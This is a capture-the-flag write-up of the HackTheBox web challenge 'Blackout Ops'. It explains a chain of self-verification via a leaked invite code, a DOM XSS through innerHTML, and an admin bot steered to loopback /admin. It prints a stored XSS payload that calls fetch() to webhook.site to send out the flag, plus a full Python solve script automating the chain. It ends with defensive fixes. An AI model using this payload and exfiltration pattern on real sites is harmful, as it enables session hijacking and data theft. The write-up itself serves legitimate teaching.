---
layout: post
title: "Blackout Ops"
date: 2027-09-11 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, dom-xss, graphql, innerhtml, admin-bot, ssrf, information-disclosure]
description: "An Easy HackTheBox web challenge where the flag lives only on an admin page. A headless admin bot visits any URL you give it, and that page renders your data through an unescaped innerHTML sink — so you store an XSS payload, steer the bot at the app's own /admin, and your script (running as admin) exfiltrates the flag."
---

## Overview

`Blackout Ops` is an Easy HackTheBox **Web** challenge built on Node/Express + Apollo GraphQL. The flag is rendered **only** on an admin-role page (`/admin`). The path to it is a three-bug chain: a `register` mutation that hands you your own invite code, a client-side [`innerHTML`](https://cwe.mitre.org/data/definitions/79.html) sink on the admin page that the server's template auto-escaping never covers, and a headless **admin bot** that will navigate to any URL you supply — including the application's own internal page.

## The technique

Three weaknesses chain together:

1. **Self-service verification (information disclosure, [CWE-200](https://cwe.mitre.org/data/definitions/200.html)).** To store an incident report you must be a *verified* user, and verification needs an `inviteCode`. The `register` mutation returns the code it just generated **to you**, so you verify your own account.

2. **Client-side [`innerHTML`](https://cwe.mitre.org/data/definitions/79.html) sink (DOM-based XSS).** The server uses nunjucks with `autoescape: true` — which lulls you into thinking output is safe. But `/admin`'s own JavaScript re-renders the reports on the client with no escaping:

   ```js
   container.innerHTML = reports.map(r => `
     <h3>${r.title}</h3>
     ...
     <p>${r.details}</p>`).join('');
   ```

   `report.title` / `report.details` are attacker-controlled, so this is a raw [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) injection. Server-side auto-escaping never touches this code path — the lesson is that escaping in one layer says nothing about a sink in another.

3. **Bot navigates to internal URLs (server-side request forgery of self, [CWE-918](https://cwe.mitre.org/data/definitions/918.html)).** When a report has an `evidenceUrl` that starts with `http://`/`https://`, the server launches puppeteer, logs in **as admin**, and `page.goto(evidenceUrl)`. Point it at the app itself — `http://127.0.0.1:1337/admin` — and the bot loads the flag-bearing page with your stored payload running in the admin origin.

> A detail that trips people up: a `<script>` element inserted via `innerHTML` does **not** execute. Use an event-handler element instead — `<img src=x onerror=…>` or `<svg onload=…>`.

## Solution

The full flow, automated in `solve.py`: register → self-verify → submit a report whose `title` is an XSS payload and whose `evidenceUrl` points the admin bot back at `/admin`. The injected `onerror` reads the flag (already in the DOM as `<h4>{{flag}}</h4>`) and exfiltrates it.

The stored payload:

```html
<img src=x onerror="fetch('https://webhook.site/<id>/?f='+encodeURIComponent(document.querySelector('h4').innerText))">
```

Because my testing box was behind NAT (no public address to receive a callback), I used **webhook.site** as a public capture endpoint — the challenge container clearly has outbound HTTPS since its admin page loads `cdn.tailwindcss.com` and `unpkg.com`. The whole thing is scriptable through webhook.site's token API.

```python
#!/usr/bin/env python3
import sys, json, time, re, requests

BASE  = "http://TARGET:PORT"
GQL   = BASE + "/graphql"
WH    = sys.argv[1]                       # webhook.site token uuid
EXFIL = f"https://webhook.site/{WH}"
EMAIL = "agent_phoenix@blackouts.htb"     # register domain must be @blackouts.htb
PW    = "Sup3rSecret!123"

s = requests.Session()
s.trust_env = False                       # ignore proxy env that returned empty bodies

def gql(q):
    return s.post(GQL, json={"query": q}, headers={"Content-Type": "application/json"}).json()

# 1. register -> the response hands us our own inviteCode
reg = gql(f'mutation {{ register(email:"{EMAIL}", password:"{PW}") {{ inviteCode }} }}')
invite = (reg.get("data") or {}).get("register", {}).get("inviteCode")

# 2. login (sets the session cookie in the jar)
gql(f'mutation {{ login(email:"{EMAIL}", password:"{PW}") {{ id role verified }} }}')

# pre-existing account: regenerate a fresh code (only allowed while unverified)
if not invite:
    invite = gql('mutation { regenerateInviteCode { inviteCode } }')["data"]["regenerateInviteCode"]["inviteCode"]

# 3. self-verify
gql(f'mutation {{ verifyAccount(inviteCode:"{invite}") {{ verified }} }}')

# 4. store the XSS report and steer the admin bot at the internal /admin page
payload = ("<img src=x onerror=\"fetch('" + EXFIL +
           "/?f='+encodeURIComponent(document.querySelector('h4').innerText))\">")
def esc(x): return x.replace('\\', '\\\\').replace('"', '\\"')
gql(f'mutation {{ submitIncidentReport('
    f'title:"{esc(payload)}", details:"x", '
    f'evidenceUrl:"http://127.0.0.1:1337/admin") {{ id }} }}')

# 5. poll webhook.site for the exfiltrated flag
for _ in range(20):
    time.sleep(4)
    blob = requests.utils.unquote(requests.get(f"https://webhook.site/token/{WH}/requests").text)
    m = re.search(r'HTB\{[^}]+\}', blob)
    if m:
        print("FLAG:", m.group(0)); break
```

Running it captures the flag live from the admin bot's request:

```
FLAG: HTB{...}
```

## Why it worked

The application escapes its *server-side* templates and stops there. The flag-bearing admin view re-emits the same user-controlled report fields through a client-side `innerHTML` assignment, which performs no encoding — so the auto-escaping is irrelevant. Combine that with a bot that holds an admin session and will browse to any URL you name, and an attacker who can only reach the public API gets their code executed in the admin origin, on the one page where the flag is printed.

## Fix / defense

- Never build HTML by concatenating untrusted values into `innerHTML`. Use `textContent` / `createElement` + `appendChild`, or sanitize with a maintained library (DOMPurify) before insertion.
- Don't let a report/preview bot navigate to internal or loopback origins — allowlist evidence hosts and strip `127.0.0.1`/`::1`/internal ranges.
- Add a Content-Security-Policy with no `unsafe-inline` so injected `onerror`/`onload` handlers can't fire.
- Don't return freshly minted invite/verification codes to the requester — deliver them out-of-band.
